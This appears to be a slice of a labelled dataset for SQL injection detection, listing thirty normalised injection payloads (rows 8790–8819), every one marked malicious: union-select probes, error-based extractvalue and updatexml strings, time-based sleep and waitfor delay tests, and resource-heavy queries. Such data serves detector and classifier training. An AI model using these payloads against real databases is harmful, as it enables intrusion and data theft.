row_index,payload_norm,label,sqli_type_hint
8790,"1',iif ( 7475 = 7475,1,1/0 )",1,
8791,"1' ) ) ) union all select null,null--",1,
8792,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1,
8793,"-5617 ) where 2132 = 2132 union all select 2132,2132,2132,2132#",1,
8794,1' ) and sleep ( 5 ),1,
8795,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup"" = ""vcup",1,
8796,"1"" ) as yzzk where 1813 = 1813 and ( 3020 = 3020 ) *6703--",1,
8797,"1'+ ( select mkbv where 1648 = 1648 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8798,-7600' or 7684 = 3181#,1,
8799,"1"" ) waitfor delay '0:0:5' and ( ""vjpg"" = ""vjpg",1,
8800,-1769 union all select 6054--,1,
8801,"1%"" ) ) rlike ( select ( case when ( 4207 = 1757 ) then 1 else 0x28 end ) ) and ( ( ""%"" = """,1,
8802,1 ) ) as bsvo where 3605 = 3605,1,
8803,"1 ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 6986 = 6986",1,
8804,"1%"" ) or sleep ( 5 ) and ( ""%"" = """,1,
8805,"-6815 ) where 2498 = 2498 union all select 2498,2498,2498,2498,2498--",1,
8806,"1' ) ) as anaq where 9605 = 9605 and elt ( 4249 = 4249,7259 ) --",1,
8807,1'+ ( select smze where 5616 = 5616,1,
8808,"1%"" ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
8809,"1' where 2373 = 2373 union all select null,null#",1,
8810,"1' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
8811,1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'xazf' = 'xazf,1,
8812,"-7126' ) ) as fzpp where 8078 = 8078 union all select 8078,8078,8078,8078,8078,8078,8078#",1,
8813,1' rlike sleep ( 5 ),1,
8814,"-8448%"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,1,
8815,"1"" ) where 8571 = 8571 and elt ( 4249 = 4249,7259 ) --",1,
8816,select ( case when ( 4059 = 7807 ) then 4059 else 1/ ( select 0 ) end ) --,1,
8817,-9809' order by 1--,1,
8818,"-9008' ) union all select 4976,4976,4976,4976#",1,
8819,"( updatexml ( 8862,concat ( 0x2e,0x7171706a71, ( select ( elt ( 8862 = 8862,1 ) ) ) ,0x717a767a71 ) ,8981 ) )",1,
